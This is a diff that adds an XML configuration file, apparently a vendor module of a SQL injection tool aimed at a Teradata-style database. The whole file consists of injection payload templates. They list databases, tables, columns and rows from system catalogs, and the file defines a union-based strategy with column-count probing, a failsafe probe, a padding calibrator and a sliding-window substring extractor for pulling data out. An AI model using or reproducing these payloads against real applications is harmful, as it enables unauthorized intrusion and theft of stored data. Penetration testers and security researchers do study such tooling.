@@ -1,0 +1,109 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<model>
+    <vendor></vendor>
+    <resource>
+        <info>
+select 
+    '-'
+    ||'${ENCLOSE_VALUE_SQL}'
+    ||database
+    ||'${ENCLOSE_VALUE_SQL}'
+    ||user
+    ||'${TRAIL_SQL}'
+        </info>
+        <schema>
+            <database>
+select 
+    '${ENCLOSE_VALUE_SQL}'
+    ||DatabaseName
+    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+FROM (
+    select 
+        DatabaseName,
+        ROW_NUMBER() over (ORDER BY DatabaseName) AS rnum
+    from DBC.DBASE
+)x
+where 1=1
+{limit}
+            </database>
+            <table>
+select 
+    '${ENCLOSE_VALUE_SQL}'
+    ||TVMName
+    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+FROM (
+    select 
+        TVMName,
+        ROW_NUMBER() over (ORDER BY TVMName) AS rnum
+    from DBC.TVM t inner join DBC.DBASE d on t.DatabaseId=d.DatabaseId
+    where DatabaseName='${DATABASE}'
+)x
+where 1=1
+{limit}
+            </table>
+            <column>
+select 
+    '${ENCLOSE_VALUE_SQL}'
+    ||FieldName
+    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+FROM (
+    select 
+        FieldName,
+        ROW_NUMBER() over (ORDER BY FieldName) AS rnum
+    from(
+        select distinct FieldName
+        from DBC.TVFIELDS c inner join DBC.TVM t on c.TableId=t.TVMId
+        inner join DBC.DBASE d on t.DatabaseId=d.DatabaseId
+        where DatabaseName='${DATABASE}'
+        and TVMName='${TABLE}'
+    )x
+)x
+where 1=1
+{limit}
+            </column>
+            <row>
+                <query>
+SELECT 
+    '${ENCLOSE_VALUE_SQL}'
+    ||r
+    ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+from (
+    select 
+        ${FIELDS} r, 
+        ROW_NUMBER() over (ORDER BY 1) AS rnum
+    from ${DATABASE}.${TABLE}
+)x
+where 1=1
+{limit}
+                </query>
+                <fields>
+                <field>trim(coalesce(''||${FIELD},''))</field>
+                <concat>||'%7f'||</concat>
+                </fields>
+            </row>
+        </schema>
+    </resource>
+    <strategy>
+        <configuration>
+            <slidingWindow>
+select
+    /**
+     * If reach end of string (SQLii) then NULLIF nullifies the result
+     */
+    'SQLi'||NULLIF(substr(
+    (${INJECTION}),
+    ${INDEX}
+    ),'${TRAIL_SQL}')
+            </slidingWindow>
+            <limit> and rnum BETWEEN ${LIMIT} AND ${LIMIT}</limit>
+            <failsafe>trim(''||(1337${INDICE}7330%2b1))</failsafe>
+            <calibrator>cast(rpad('%23',1024,'%23')as varchar(1024))</calibrator>
+            <limitBoundary>1</limitBoundary>
+        </configuration>
+        <normal>
+            <indices> union select ${INDICES} FROM(SELECT 1 AS x)x</indices>
+            <capacity>(select 'SQLi${INDICE}'||${CALIBRATOR})</capacity>
+            <orderBy> order by 1337</orderBy>
+        </normal>
+    </strategy>
+</model>
